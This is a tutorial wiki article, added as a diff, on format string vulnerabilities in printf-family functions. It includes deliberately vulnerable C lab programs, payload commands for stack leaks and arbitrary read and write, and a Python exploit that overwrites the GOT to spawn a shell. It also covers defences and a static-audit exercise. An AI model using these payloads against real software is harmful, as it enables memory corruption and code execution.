@@ -1,0 +1,976 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Format Strings | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Format Strings">
+		<meta name="keywords" content="arbitrary-write, format-string, fortify-source, fprintf, got-overwrite, memory-corruption, printf, sprintf, stack-leak, techniques">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Format Strings">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="User-controlled format string bugs in printf-family functions that leak stack data, read and write arbitrary memory, and can redirect execution to a shell.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/fundamentals/format-strings.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Format Strings">
+		<meta name="twitter:description" itemprop="description" content="User-controlled format string bugs in printf-family functions that leak stack data, read and write arbitrary memory, and can redirect execution to a shell.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-vulnerability">The Vulnerability</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#how-printf-walks-its-arguments">How printf Walks Its Arguments</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#format-specifiers-that-matter">Format Specifiers That Matter</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#stack-reading-with-x">Stack Reading with %x</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#direct-parameter-access-nx">Direct Parameter Access: %N$x</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#s-arbitrary-read">%s: Arbitrary Read</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#n-arbitrary-write">%n: Arbitrary Write</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#got-overwrite-to-code-execution">GOT Overwrite to Code Execution</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#compiler-warnings">Compiler Warnings</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#fortify-source-mitigation">FORTIFY_SOURCE Mitigation</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#real-world-format-string-vulnerabilities">Real-World Format String Vulnerabilities</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#aslr-and-format-strings">ASLR and Format Strings</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#detection-with-static-analysis">Detection with Static Analysis</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#summary">Summary</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/fundamentals/index.html">Fundamentals</a></li>
+						<li aria-current="page"><a href="/wiki/articles/fundamentals/format-strings.html">Format Strings</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="format-strings">Format Strings</h2>
+					<p>
+						User-controlled format string bugs in printf-family functions that leak stack data, read and
+						write arbitrary memory, and can redirect execution to a shell.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							A format string bug appears when a program passes attacker-controlled data as the format argument
+							to a
+							<code>printf</code>
+							-family function. The format string then drives how the function walks its arguments,
+							which turns a logging call into a primitive for reading stack memory, reading arbitrary addresses,
+							and writing arbitrary values. This article follows the bug from the calling convention up to
+							a working control-flow hijack, then covers the compiler and libc hardening that fights back.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/stack.html">Stack</a> - stack layout, calling conventions, argument passing</li>
+							<li><a href="/wiki/articles/fundamentals/buffer-overflows.html">Buffer Overflows</a> - memory corruption primitives</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="the-vulnerability">The Vulnerability</h3>
+						<p>
+							A format string vulnerability exists when user-controlled data is passed as the
+							<em>format</em>
+							argument
+							to a
+							<code>printf</code>
+							-family function:
+						</p>
+						<pre class="c">
+printf(user_input);         // VULNERABLE
+printf(&#34;%s&#34;, user_input);   // SAFE
+						</pre>
+						<p>
+							The first form interprets
+							<code>user_input</code>
+							as a format string. Format specifiers embedded in the
+							input (
+							<code>%x</code>
+							,
+							<code>%n</code>
+							,
+							<code>%s</code>
+							) are processed by
+							<code>printf</code>
+							, which reads arguments from the stack
+							(or register spill area) as if they were passed by the caller. Since no arguments were actually
+							passed,
+							<code>printf</code>
+							reads whatever values happened to be in those locations.
+						</p>
+						<p>
+							The second form binds
+							<code>user_input</code>
+							to the
+							<code>%s</code>
+							specifier - only printable characters are emitted.
+							This is the correct pattern.
+						</p>
+					</section>
+					<section>
+						<h3 id="how-printf-walks-its-arguments">How printf Walks Its Arguments</h3>
+						<p>
+							On x86-64 System V ABI, the first six integer/pointer arguments pass in registers:
+							<code>rdi</code>
+							(format
+							string),
+							<code>rsi</code>
+							,
+							<code>rdx</code>
+							,
+							<code>rcx</code>
+							,
+							<code>r8</code>
+							,
+							<code>r9</code>
+							. The seventh and beyond pass on the stack. Floating-point
+							arguments use
+							<code>xmm0</code>
+							-
+							<code>xmm7</code>
+							.
+						</p>
+						<p>
+							<code>printf</code>
+							is a variadic function. It doesn't know how many arguments were passed. It trusts the
+							format string to tell it. For each
+							<code>%</code>
+							specifier,
+							<code>printf</code>
+							reads the next argument slot using
+							<code>va_arg(ap, type)</code>
+							. If the format string has 20
+							<code>%x</code>
+							specifiers but zero arguments were passed,
+							<code>printf</code>
+							reads 20 values from register spill area (saved on the va_list stack) and the stack.
+						</p>
+						<p>
+							The va_list is constructed by
+							<code>va_start(ap, format)</code>
+							. On x86-64,
+							<code>va_start</code>
+							saves the register
+							arguments (
+							<code>rsi</code>
+							..
+							<code>r9</code>
+							) to a "register save area" on the stack and sets up a pointer into
+							the overflow argument area (stack-passed args). The format string controls exactly how many
+							arguments
+							<code>printf</code>
+							consumes.
+						</p>
+					</section>
+					<section>
+						<h3 id="format-specifiers-that-matter">Format Specifiers That Matter</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Specifier</th>
+									<th align="center">Reads/Writes</th>
+									<th align="center">Description</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>%d</code></td>
+									<td align="center">Reads 4 bytes</td>
+									<td align="center">Signed decimal integer</td>
+								</tr>
+								<tr>
+									<td align="center"><code>%u</code></td>
+									<td align="center">Reads 4 bytes</td>
+									<td align="center">Unsigned decimal integer</td>
+								</tr>
+								<tr>
+									<td align="center"><code>%x</code></td>
+									<td align="center">Reads 4 bytes</td>
+									<td align="center">Lowercase hexadecimal</td>
+								</tr>
+								<tr>
+									<td align="center"><code>%lx</code></td>
+									<td align="center">Reads 8 bytes</td>
+									<td align="center">Long hexadecimal (64-bit)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>%p</code></td>
+									<td align="center">Reads 8 bytes</td>
+									<td align="center">Pointer (prefixed 0x)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>%s</code></td>
+									<td align="center"><b>Dereferences pointer</b>, reads bytes until<code>\0</code></td>
+									<td align="center">String from address</td>
+								</tr>
+								<tr>
+									<td align="center"><code>%n</code></td>
+									<td align="center"><b>Writes 4 bytes</b>to pointer on stack</td>
+									<td align="center">Count of bytes written so far</td>
+								</tr>
+								<tr>
+									<td align="center"><code>%hn</code></td>
+									<td align="center"><b>Writes 2 bytes</b>(halfword)</td>
+									<td align="center">Halfword write</td>
+								</tr>
+								<tr>
+									<td align="center"><code>%hhn</code></td>
+									<td align="center"><b>Writes 1 byte</b>(byte)</td>
+									<td align="center">Byte write</td>
+								</tr>
+								<tr>
+									<td align="center"><code>%ln</code></td>
+									<td align="center"><b>Writes 8 bytes</b>(long)</td>
+									<td align="center">64-bit write</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							<code>%s</code>
+							is a read primitive - if you place a target address on the stack where
+							<code>printf</code>
+							expects
+							a
+							<code>char*</code>
+							argument,
+							<code>printf</code>
+							dereferences it and prints bytes from that memory until a null
+							byte. This is an arbitrary read.
+						</p>
+						<p>
+							<code>%n</code>
+							is a write primitive - it stores the number of bytes written so far (
+							<code>printf</code>
+							's internal
+							character count) to the address pointed to by the corresponding argument. If you place a target
+							address on the stack where
+							<code>printf</code>
+							expects an
+							<code>int*</code>
+							, the count is written there. This is
+							an arbitrary write.
+						</p>
+					</section>
+					<section>
+						<h3 id="stack-reading-with-x">Stack Reading with %x</h3>
+						<p>The simplest exploitation: leak stack contents.</p>
+						<pre class="c">
+/* fmt_leak.c — compile with -no-pie, run and observe */
+#include &lt;stdio.h&gt;
+
+int main() {
+    char secret[] = &#34;FLAG{stack-leaked-data}&#34;;
+    char input[256];
+
+    printf(&#34;secret is at %p\n&#34;, secret);
+
+    fgets(input, sizeof(input), stdin);
+    printf(input);  /* VULNERABLE */
+    printf(&#34;\n&#34;);
+
+    return 0;
+}
+						</pre>
+						<pre class="bash">
+gcc -g -no-pie -fno-stack-protector -o fmt_leak fmt_leak.c
+./fmt_leak &lt;&lt;&lt; &#39;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&#39;
+						</pre>
+						<p>
+							The output leaks return addresses, saved frame pointers, and - if somewhere on the stack - the
+							secret string address and contents. Each
+							<code>%p</code>
+							reads 8 bytes from the argument area. On a typical
+							run:
+						</p>
+						<pre class="plaintext">
+secret is at 0x7fffffffde90
+0x7ffff7faa580.0x1.0x7ffff7e08e6e.(nil).0x7ffff7fa18a8.0x70252e70252e7025...
+						</pre>
+						<p>
+							The ASCII values
+							<code>0x70252e70252e7025</code>
+							are the format string itself (
+							<code>%p.%p.%p...</code>
+							) - the input
+							buffer is on the stack and
+							<code>printf</code>
+							reads back its own format string bytes. This demonstrates
+							that the format string itself sits in memory reachable by the arg-walking logic.
+						</p>
+					</section>
+					<section>
+						<h3 id="direct-parameter-access-nx">Direct Parameter Access: %N$x</h3>
+						<p>
+							Normally, format specifiers consume arguments sequentially.
+							<code>%N$x</code>
+							lets you skip to the Nth
+							argument directly:
+						</p>
+						<pre class="plaintext">
+%1$x  →  first argument (rsi)
+%2$x  →  second argument (rdx)
+%6$x  →  first stack-passed argument (position 6 on x86-64)
+						</pre>
+						<p>
+							This is critical for exploitation - instead of printing 20 values to reach a target on the stack,
+							you can directly reference the argument position where your target address sits:
+						</p>
+						<pre class="bash">
+echo &#39;%6$p&#39; | ./fmt_leak
+# reads the 6th argument (first on stack) as a pointer
+						</pre>
+						<p>Finding the offset of your input on the stack:</p>
+						<pre class="bash">
+# Send AAAA followed by many %p to find where 0x41414141 appears
+python3 -c &#34;print(&#39;AAAA&#39; + &#39;.%p&#39; * 20)&#34; | ./fmt_leak
+# Find which position shows 0x41414141 — that&#39;s where your input begins
+# in the argument list.
+
+# Once found, use %N$x to reference it directly:
+# If AAAA appears at position 8:
+python3 -c &#34;import sys; sys.stdout.buffer.write(b&#39;%8\$p&#39;)&#34; | ./fmt_leak
+# prints the first 8 bytes of the format string buffer as a pointer
+						</pre>
+					</section>
+					<section>
+						<h3 id="s-arbitrary-read">%s: Arbitrary Read</h3>
+						<p>
+							If you place an address on the stack at a position where
+							<code>printf</code>
+							expects a string argument,
+							<code>%s</code>
+							dereferences it and reads memory:
+						</p>
+						<pre class="c">
+/* fmt_read.c — arbitrary read via %s */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main() {
+    char target[] = &#34;SENSITIVE_DATA_12345&#34;;
+    char fmt[256];
+
+    printf(&#34;target @ %p = %s\n&#34;, target, target);
+
+    fgets(fmt, sizeof(fmt), stdin);
+
+    /* Craft input: [address of target as bytes] + %N$s
+       where N is the position on the stack where [address bytes] appear */
+
+    printf(fmt);  /* VULNERABLE: %s dereferences our injected address */
+    printf(&#34;\n&#34;);
+
+    return 0;
+}
+						</pre>
+						<p>
+							The attack string: 8 bytes of the target address (little-endian), then
+							<code>%6$s</code>
+							(or whichever
+							position corresponds to the start of the format buffer on the stack).
+						</p>
+						<pre class="bash">
+# Determine offset of format buffer on printf&#39;s argument list:
+python3 -c &#34;print(&#39;AAAABBBB&#39; + &#39;.%p&#39; * 15)&#34; | ./fmt_read
+# Note which position shows 0x4242424241414141 (AAAABBBB)
+
+# Suppose position = 6.
+# target = 0x7fffffffde90
+# Craft bytes: \x90\xde\xff\xff\xff\x7f\x00\x00 + %6$s
+
+python3 -c &#34;
+import sys
+addr = 0x7fffffffde90
+payload = addr.to_bytes(8, &#39;little&#39;) + b&#39;%6\$s\n&#39;
+sys.stdout.buffer.write(payload)
+&#34; | ./fmt_read
+
+# Output: SENSITIVE_DATA_12345 (leaked from memory!)
+						</pre>
+					</section>
+					<section>
+						<h3 id="n-arbitrary-write">%n: Arbitrary Write</h3>
+						<p>
+							<code>%n</code>
+							stores the cumulative number of characters written so far into the
+							<code>int*</code>
+							pointed to by
+							the argument. By controlling both the character count (via padding like
+							<code>%NNNNc</code>
+							) and the address
+							on the stack, you write an arbitrary value to an arbitrary location.
+						</p>
+						<pre class="c">
+/* fmt_write.c — arbitrary write via %n */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+unsigned int target = 0xDEADBEEF;
+
+int main() {
+    char fmt[256];
+
+    printf(&#34;target @ %p = 0x%08x\n&#34;, &amp;target, target);
+
+    fgets(fmt, sizeof(fmt), stdin);
+    printf(fmt);  /* VULNERABLE */
+    printf(&#34;\n&#34;);
+
+    printf(&#34;target now = 0x%08x\n&#34;, target);
+    return 0;
+}
+						</pre>
+						<p>
+							To write value 0x00000041 (65 decimal) to
+							<code>&amp;target</code>
+							at stack position 6:
+						</p>
+						<pre class="bash">
+# payload: [8 bytes: &amp;target] + %65c%6$n
+# %65c prints a character padded to 65 width → printf count = 65
+# %6$n writes 65 to *(int*) stack_position_6
+
+python3 -c &#34;
+import sys
+target_addr = 0x555555558014  # from program output
+payload = target_addr.to_bytes(8, &#39;little&#39;)
+payload += b&#39;%65c%6\$n\n&#39;
+sys.stdout.buffer.write(payload)
+&#34; | ./fmt_write
+
+# target now = 0x00000041
+						</pre>
+						<p>
+							For multi-byte writes, use
+							<code>%hn</code>
+							(2-byte writes) or
+							<code>%hhn</code>
+							(1-byte writes) to write larger addresses
+							in chunks without printing billions of characters:
+						</p>
+						<pre class="bash">
+# Write 0x41424344 as 4 single-byte writes at offsets 0,1,2,3:
+# addr+0 → %hhn writes byte 0
+# addr+1 → %hhn writes byte 1
+# ...etc.
+
+# Each write needs:
+#   [8 bytes: target_addr + offset]
+#   %NNc to adjust counter
+#   %pos$hhn to write byte
+
+# This requires the target addresses to be on the stack (stack positions 6,7,8,9)
+# so the entire payload is:
+# [addr][addr+1][addr+2][addr+3] + %c%c%c%c for each + %hhn modifiers
+						</pre>
+					</section>
+					<section>
+						<h3 id="got-overwrite-to-code-execution">GOT Overwrite to Code Execution</h3>
+						<p>
+							The Global Offset Table (GOT) holds function pointers resolved by the dynamic linker. When
+							<code>printf</code>
+							is called, the PLT stub jumps through the GOT entry for
+							<code>printf</code>
+							to reach the actual glibc implementation.
+							If an attacker overwrites
+							<code>printf@GOT</code>
+							with the address of
+							<code>system</code>
+							, subsequent calls to
+							<code>printf</code>
+							jump to
+							<code>system</code>
+							instead.
+						</p>
+						<pre class="c">
+/* got_overwrite.c — format string → GOT overwrite */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void target_func() {
+    printf(&#34;You should never see this\n&#34;);
+}
+
+int main() {
+    char buf[256];
+
+    printf(&#34;printf@GOT = %p\n&#34;, printf);   /* actually PLT, need real GOT addr */
+    printf(&#34;system    = %p\n&#34;, system);
+    printf(&#34;Input: &#34;);
+    fgets(buf, sizeof(buf), stdin);
+
+    printf(buf);  /* VULNERABLE — overwrites printf@GOT with system */
+
+    /* Second printf call goes through GOT → system(&#34;/bin/sh&#34;) if we win */
+    printf(&#34;/bin/sh&#34;);
+
+    return 0;
+}
+						</pre>
+						<p>
+							The goal: overwrite
+							<code>printf@GOT</code>
+							with
+							<code>system@plt</code>
+							(or
+							<code>system</code>
+							's real address). After the
+							vulnerable
+							<code>printf(buf)</code>
+							executes, the GOT entry is poisoned. The next
+							<code>printf(&#34;/bin/sh&#34;)</code>
+							calls
+							<code>system(&#34;/bin/sh&#34;)</code>
+							- spawning a shell.
+						</p>
+						<p>
+							The GOT entry for
+							<code>printf</code>
+							is resolved lazily on its first call, so an earlier
+							<code>printf</code>
+							in the
+							same run leaves the entry pointing at the real libc function. The format string overwrites that
+							resolved address with the address of
+							<code>system</code>
+							byte-by-byte using
+							<code>%hhn</code>
+							at calculated offsets.
+							A binary linked with
+							<code>LD_BIND_NOW=1</code>
+							resolves every entry eagerly, and full RELRO makes the
+							GOT read-only, which blocks this target.
+						</p>
+						<pre class="python">
+# got_overwrite_exploit.py
+import struct
+import sys
+
+# These addresses depend on the binary:
+printf_got = 0x404018   # from objdump -R ./got_overwrite | grep printf
+system_plt = 0x401050   # from objdump -d ./got_overwrite | grep &#39;&lt;system@plt&gt;&#39;
+
+# system_plt bytes: 0x0000000000401050 (little-endian: 50 10 40 00 00 00 00 00)
+
+# We need to write 4 byte values: 0x50, 0x10, 0x40, 0x00
+# to addresses: printf_got+0, printf_got+1, printf_got+2, printf_got+3
+# sorted by value ascending so the counter only increases
+
+writes = [
+    (printf_got + 1, 0x10),
+    (printf_got + 0, 0x50),
+    (printf_got + 2, 0x40),
+    (printf_got + 3, 0x00),
+]
+writes.sort(key=lambda x: x[1])
+
+# Build payload
+payload = b&#39;&#39;
+for addr, val in writes:
+    payload += struct.pack(&#39;&lt;Q&#39;, addr)
+
+# Stack positions for our addresses (depends on buffer offset):
+# Position 6 corresponds to start of buf on stack
+# So addresses are at positions 6, 8, 10, 12 (each address = 8 bytes = 2 stack slots)
+# Wait, each 8-byte address occupies ONE argument position on x86-64
+# So addresses are at 6, 7, 8, 9
+
+# Now the %c/%hhn specifiers
+counter = 0
+for i, (addr, val) in enumerate(writes):
+    needed = (val - counter) % 256
+    if needed &gt; 0:
+        payload += f&#39;%{needed}c&#39;.encode()
+    payload += f&#39;%{6+i}$hhn&#39;.encode()
+    counter = val
+
+payload += b&#39;\n&#39;
+
+sys.stdout.buffer.write(payload)
+						</pre>
+						<pre class="bash">
+python3 got_overwrite_exploit.py | ./got_overwrite
+# If successful: drops to sh prompt
+						</pre>
+					</section>
+					<section>
+						<h3 id="compiler-warnings">Compiler Warnings</h3>
+						<p>
+							GCC emits
+							<code>-Wformat-security</code>
+							warnings for
+							<code>printf(foo)</code>
+							where
+							<code>foo</code>
+							is not a string literal:
+						</p>
+						<pre class="bash">
+gcc -Wformat -Wformat-security -o test test.c
+# test.c:15:5: warning: format not a string literal and no format arguments
+# [-Wformat-security]
+#    15 |     printf(buf);
+#       |     ^~~~~~
+						</pre>
+						<p>
+							<code>-Wformat-security</code>
+							is part of
+							<code>-Wall</code>
+							in most GCC versions. Despite this, vulnerable code persists
+							<ul>
+								<li>legacy codebases, macros that hide <code>printf</code> calls, and <code>syslog()</code> -style logging where the</li>
+							</ul>
+						</p>
+						<p>format is constructed dynamically.</p>
+					</section>
+					<section>
+						<h3 id="fortify-source-mitigation">FORTIFY_SOURCE Mitigation</h3>
+						<p>
+							glibc's
+							<code>_FORTIFY_SOURCE</code>
+							(levels 1 and 2) provides runtime protections against format string
+							attacks:
+						</p>
+						<pre class="bash">
+# Compile with FORTIFY_SOURCE:
+gcc -O2 -D_FORTIFY_SOURCE=2 -o fmt_fort fmt_leak.c
+
+# At runtime, printf checks if the format string is in a writable segment.
+# If the format string contains %n and the format is in writable memory:
+#   *** %n in writable segment detected ***
+#   Aborted (core dumped)
+						</pre>
+						<p>
+							<code>_FORTIFY_SOURCE=2</code>
+							uses
+							<code>__builtin_object_size</code>
+							to determine the size of the destination buffer
+							and
+							<code>__printf_chk</code>
+							which rejects
+							<code>%n</code>
+							when the format string is writable (on the stack or heap).
+							This only blocks
+							<code>%n</code>
+							-
+							<code>%s</code>
+							arbitrary read still works.
+						</p>
+						<p>
+							The bypass: if the format string is in a read-only segment (e.g., a constant string in .rodata),
+							<code>%n</code>
+							is allowed because it's considered a "trusted" format string. This is why format string
+							vulnerabilities in
+							<code>syslog()</code>
+							(where user data goes to a format string constant + user suffix)
+							are harder to exploit.
+						</p>
+					</section>
+					<section>
+						<h3 id="real-world-format-string-vulnerabilities">Real-World Format String Vulnerabilities</h3>
+						<p>
+							<b>syslog injection.</b>
+							
+							<code>syslog(LOG_ERR, user_data);</code>
+							- user_data contains format specifiers.
+							The syslog daemon may be running as root.
+						</p>
+						<p>
+							<b>printf-format error messages.</b>
+							
+							<code>fprintf(stderr, error_message);</code>
+							where
+							<code>error_message</code>
+							comes
+							from a network response or file. Diagnostic messages rarely sanitize format specifiers.
+						</p>
+						<p>
+							<b>Internationalization.</b>
+							
+							<code>printf(gettext(&#34;Hello %s&#34;), name);</code>
+							- if the translation file is
+							compromised,
+							<code>%n</code>
+							can be injected. Mitigated by restricting translation file write access and
+							validating translations.
+						</p>
+						<p>
+							<b>Windows 'FormatMessage'.</b>
+							The Windows
+							<abbr title="Application Programming Interface">API</abbr>
+							equivalent
+							(
+							<code>%1!s!</code>
+							etc.) has its own set of format string bugs with different exploitation characteristics.
+						</p>
+					</section>
+					<section>
+						<h3 id="aslr-and-format-strings">ASLR and Format Strings</h3>
+						<p>
+							ASLR randomizes stack and library addresses. For format string attacks, this means: - The format
+							string buffer is at a randomized stack address -
+							<code>%6$p</code>
+							leaks it, breaking ASLR. - GOT addresses
+							are known from the binary (no PIE). Combined, format string reads leak stack addresses, format
+							string writes modify GOT entries.
+						</p>
+						<p>
+							A format string vulnerability with full RELRO is harder: the GOT is read-only. But function
+							pointers on the heap (e.g., C++ vtable),
+							<code>__exit_funcs</code>
+							, or
+							<code>.fini_array</code>
+							destructor pointers
+							are alternative write targets.
+						</p>
+					</section>
+					<section>
+						<h3 id="detection-with-static-analysis">Detection with Static Analysis</h3>
+						<p>
+							Clang Static Analyzer's
+							<code>security.insecureAPI.DeprecatedOrUnsafeBufferHandling</code>
+							does NOT catch
+							format string bugs. Use specialized checkers:
+						</p>
+						<pre class="bash">
+# flawfinder (basic pattern match):
+flawfinder fmt_leak.c
+# fmt_leak.c:15: [4] (format) printf: If format strings can be
+#   influenced by an attacker, they can be exploited.
+
+# CodeQL query (semantic):
+# from FunctionCall call
+# where call.getTarget().hasName(&#34;printf&#34;) and
+#   not call.getArgument(0).getValue() instanceof StringLiteral
+# select call
+						</pre>
+					</section>
+					<section>
+						<h3 id="summary">Summary</h3>
+						<p>
+							A format string vulnerability is a user-controlled format argument to
+							<code>printf</code>
+							-family functions.
+							It provides three primitives: stack reading (
+							<code>%x</code>
+							,
+							<code>%p</code>
+							), arbitrary memory reading (
+							<code>%s</code>
+							with injected address), and arbitrary writing (
+							<code>%n</code>
+							with injected address and character-count
+							padding). The
+							<code>%n</code>
+							specifier is the crown jewel - it converts a log statement into a write-what-where
+							primitive. The exploit chain: leak addresses -> overwrite GOT entry -> redirect execution to
+							<code>system</code>
+							. Mitigations: always use
+							<code>printf(&#34;%s&#34;, input)</code>
+							, enable
+							<code>-Wformat-security</code>
+							, compile
+							with
+							<code>_FORTIFY_SOURCE=2</code>
+							, and use full RELRO to protect the GOT.
+						</p>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Write a Go tool that audits C source files for format string bugs. Read the file line by line,
+							find calls to
+							<code>printf</code>
+							,
+							<code>fprintf</code>
+							,
+							<code>sprintf</code>
+							,
+							<code>snprintf</code>
+							,
+							<code>syslog</code>
+							, and
+							<code>dprintf</code>
+							, and
+							report every call whose format argument is not a string literal. A call is safe when the first
+							argument is a quoted string; a call is suspect when the first argument is a variable, a macro,
+							or a function call. Print one finding per line as
+							<code>&lt;file&gt;:&lt;line&gt;: unsafe &lt;function&gt; call</code>
+							.
+						</p>
+						<p>Start from this skeleton:</p>
+						<pre class="go">
+package main
+
+import (
+	&#34;bufio&#34;
+	&#34;fmt&#34;
+	&#34;os&#34;
+	&#34;regexp&#34;
+)
+
+var callRe = regexp.MustCompile(`\b(printf|fprintf|sprintf|snprintf|syslog|dprintf)\s*\(`)
+
+func main() {
+	if len(os.Args) &lt; 2 {
+		fmt.Fprintln(os.Stderr, &#34;usage: fmt-audit file.c&#34;)
+		os.Exit(1)
+	}
+
+	f, err := os.Open(os.Args[1])
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+	defer f.Close()
+
+	scanner := bufio.NewScanner(f)
+	line := 0
+	for scanner.Scan() {
+		line++
+		text := scanner.Text()
+		// TODO: find calls with callRe, inspect the first argument,
+		// and print &#34;&lt;file&gt;:&lt;line&gt;: unsafe &lt;function&gt; call&#34; for suspects.
+		_ = text
+	}
+}
+						</pre>
+						<p>
+							Test it against the
+							<code>fmt_leak.c</code>
+							and
+							<code>fmt_read.c</code>
+							listings above. Then extend the tool so it
+							also flags
+							<code>%n</code>
+							in a format string, since that is the specifier that turns a read into a write.
+						</p>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://man.archlinux.org/man/printf.3" target="_blank">printf(3) - Linux manual page</a></li>
+							<li><a class="icon-website" href="https://owasp.org/www-community/attacks/Format_string_attack" target="_blank">Format string attack - OWASP</a></li>
+							<li><a class="icon-download" href="https://cs155.stanford.edu/papers/formatstring-1.2.pdf" target="_blank">Exploiting Format String Vulnerabilities - scut / team teso</a></li>
+							<li><a class="icon-website" href="https://gcc.gnu.org/onlinedocs/gcc/Common-Function-Attributes.html" target="_blank">Common Function Attributes and format checking - GCC</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
